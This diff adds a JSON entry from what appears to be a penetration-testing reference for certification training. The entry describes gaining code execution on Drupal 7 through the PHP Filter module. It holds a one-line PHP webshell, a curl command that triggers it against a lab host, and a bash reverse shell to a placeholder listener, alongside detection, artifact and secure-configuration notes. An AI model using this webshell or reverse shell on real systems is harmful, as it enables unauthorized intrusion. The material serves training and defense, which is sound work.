@@ -1,0 +1,92 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "drupal",
+    "curl"
+  ],
+  "tags": [
+    "drupal",
+    "webshell",
+    "rce"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Drupal",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Trigger the PHP-filter node webshell",
+      "command": "curl -s 'http://drupal-qa.inlanefreight.local/node/3?<rand>=id'"
+    },
+    {
+      "label": "Same shell used to launch a reverse shell",
+      "command": "curl -s 'http://.../node/3?<rand>=bash -c \"bash -i >& /dev/tcp/<lhost>/4444 0>&1\"'"
+    }
+  ],
+  "notes": "Only works on versions where the core PHP Filter module exists/can be enabled (Drupal 7). On Drupal 8+ use the backdoored-module or Drupalgeddon2 path instead.",
+  "references": [
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "drupal-detect",
+      "note": "Confirms the version supports the PHP filter module.",
+      "rel": "prereq"
+    },
+    {
+      "id": "drupal-backdoor-module",
+      "note": "Newer Drupal: hide the shell inside a module instead.",
+      "rel": "alternative"
+    },
+    {
+      "id": "reverse-shell-oneliners",
+      "note": "Upgrade to an interactive reverse shell.",
+      "rel": "escalation"
+    }
+  ],
+  "id": "drupal-php-filter-webshell",
+  "name": "Drupal - PHP Filter Module Webshell",
+  "command": "<?php system($_GET['<rand>']); ?>",
+  "description": "On Drupal versions with the PHP Filter module, create a node with PHP body input containing a system() call to gain RCE. On newer versions, install the PHP module first.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1505.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Drupal's PHP Filter module (when enabled) allows admin users to create content nodes containing raw PHP code executed server-side. Adding a webshell as node content and visiting its URL executes arbitrary PHP.",
+    "prerequisites": "Valid Drupal admin credentials. PHP Filter module enabled. (Drupal 8+ requires manual installation of the php module.)",
+    "impact": "RCE as www-data via a content node. Persistent access through the CMS without touching the filesystem directly.",
+    "detection": "Node creation with text_format=php_code via admin. Unexpected PHP output in node response. Drupal watchdog log for content creation.",
+    "artifacts": "Drupal watchdog log (node created by admin) | Web server access log (GET to node with query param) | Database: nodes table containing PHP code",
+    "prevention": "Never enable the PHP Filter module in production. If required, restrict to a dedicated role not given to regular admins. Disable module entirely if possible.",
+    "misconfiguration": "PHP Filter module enabled in Drupal, allowing admin users to save and execute arbitrary PHP through the content interface.",
+    "vulnerable_config": "# Drupal -- PHP Filter module enabled (allows PHP in node content)\n# /admin/modules -- PHP Filter module: [x] Enabled\n# Any user with 'Use the PHP evaluator' permission can execute arbitrary code\n\n# settings.php -- no restriction on who can create PHP nodes\n$conf['filter_allowed_protocols'] = array('http', 'https', 'ftp', 'ftps', 'mailto', 'news', 'tel');\n# php module enabled in modules/ directory and active",
+    "secure_config": "# Drupal -- disable PHP Filter module entirely\n# /admin/modules: PHP Filter module: [ ] Disabled\n\n# If PHP execution is needed, restrict permission strictly:\n# /admin/people/permissions:\n#   Use the PHP evaluator: [ ] authenticated user\n#                          [ ] editor\n#                          [x] administrator only (and only if required)\n\n# Better: use Twig templates instead of PHP filter\n# Remove php.module from sites/all/modules/ entirely\n# Verify in settings.php:\n$settings['trusted_host_patterns'] = ['^www\\.example\\.com$'];",
+    "sources": [
+      "HTB M24",
+      "MITRE T1505.003",
+      "OWASP A04:2021"
+    ]
+  }
+}
